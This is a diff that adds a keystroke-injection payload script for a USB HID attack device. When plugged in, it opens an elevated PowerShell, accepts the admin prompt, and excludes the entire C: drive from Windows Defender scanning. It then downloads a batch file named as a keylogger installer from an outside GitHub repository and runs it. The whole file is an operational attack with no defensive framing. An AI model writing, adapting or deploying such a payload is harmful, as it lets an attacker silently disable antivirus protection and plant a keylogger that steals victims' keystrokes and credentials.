@@ -1,0 +1,22 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 1000
+LEFT_ARROW
+DELAY 500
+ENTER
+DELAY 500
+STRING Add-MpPreference -ExclusionPath "C:\"
+DELAY 300
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri "https://github.com/malwaresuca/malware/raw/main/keylogger_download.bat" -OutFile "aa.bat"
+DELAY 300
+ENTER
+DELAY 1500
+STRING ./aa.bat
+DELAY 300
+ENTER
